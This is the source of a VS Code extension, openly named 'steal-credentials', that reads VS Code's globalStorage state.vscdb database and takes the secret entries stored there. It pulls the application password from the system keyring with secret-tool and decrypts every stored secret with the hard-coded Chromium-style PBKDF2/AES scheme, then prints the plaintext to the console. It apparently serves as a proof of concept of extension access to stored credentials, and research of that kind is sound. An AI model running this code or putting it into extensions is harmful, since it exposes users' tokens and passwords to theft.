// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
import * as vscode from 'vscode';
import { Database } from 'sqlite3';
import { exec } from 'child_process';
import { promisify } from 'util';

import { PBKDF2, AES, enc, algo, lib } from 'crypto-js';

// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed
export function activate(context: vscode.ExtensionContext) {

	const disposable = vscode.commands.registerCommand('steal-credentials.enum', async () => {
		const dbpath = `${process.env.HOME}/.config/Code/User/globalStorage/state.vscdb`;
		const db = new Database(dbpath);

		let rows: any[] = [];
		db.all("SELECT * FROM ItemTable", rows, (err: any, result: any[]) => {
			if (err) {
				console.log('err:');
				console.error(err);
			}
			rows = result.filter((row: any) => {
				return row.key.startsWith('secret://');
			});
		});
		// wait for db.all to finish
		while (rows.length === 0) {
			await new Promise(resolve => setTimeout(resolve, 100));
		}
		db.close();
		console.log('Found %d secrets stored in %s.', rows.length, dbpath);

		const secret = await getApplicationSecretFromKeyRing('Code');
		console.log('Found password in keyring:', secret);

		console.log('------------------------');
		console.log('DECRYPTING SECRETS');
		console.log('------------------------');
		for (let i = 0; i < rows.length; i++) {

			console.log('Decrypting entry for: ' + rows[i].key);

			var value = rows[i].value;
			// Parse the JSON string to get the object
			const parsedData = JSON.parse(value);
			// Extract the byte array
			const byteArray = parsedData.data;
			const uint8Array = new Uint8Array(byteArray);
			// Convert the Uint8Array to a base64 encoded string
			const base64String = btoa(String.fromCharCode.apply(null, Array.from(uint8Array)));
			console.log('Base64 encrypted secret: ' + base64String);

			const decrypted = getDecryptedData(secret, base64String);
			console.log('decrypted:', decrypted);

			console.log('------------------------');
		}

	});
	context.subscriptions.push(disposable);
}

function clean(x: string): string {
	const padding = x.charCodeAt(x.length - 1);
	return x.slice(0, -padding);
}

function getDecryptedData(password: string, data: string): string {
	var parsed_data = enc.Base64.parse(data);
	if (!parsed_data) {
		throw new Error('Failed to parse data');
	}
	// Trim off the 'v10' / 'v11' prefix
	var cipher = parsed_data.toString(enc.Hex).substring(6);

	const iv = enc.Utf8.parse(' '.repeat(16));

	const key = PBKDF2(password, 'saltysalt', {
		keySize: 4, // 4 words = 128 bits = 16 bytes
		iterations: 1,
		hasher: algo.SHA1
	});

	var prams = lib.CipherParams.create({ ciphertext: enc.Hex.parse(cipher) });
	var decrypted = AES.decrypt(prams, key, { iv: iv });
	return enc.Hex.parse(decrypted.toString()).toString(enc.Utf8);
}

async function getApplicationSecretFromKeyRing(application: string): Promise<string> {
	const prmomised_exec = promisify(exec);

	const { stdout, stderr } = await prmomised_exec('secret-tool search application ' + application).catch(err => {
		console.error('Error:', err);
		return { stdout: '', stderr: '' };
	});

	if (stderr) {
		const parts = stderr.split(' = ');
		if (parts.length < 2 || parts[0] !== 'attribute.application' || parts[1].trim() !== application) {
			console.error('stderr not as expected:', stderr);
			console.error('parts:', parts);
			return '';
		}
	} else {
		console.error('stderr unexpectedly empty');
		return '';
	}

	const secret = stdout
		.split('\n')
		.map(line => line.split(' = '))
		.find(parts => parts.length >= 2 && parts[0] === 'secret')
		?.[1];

	return secret || '';
}

// This method is called when your extension is deactivated
export function deactivate() { }
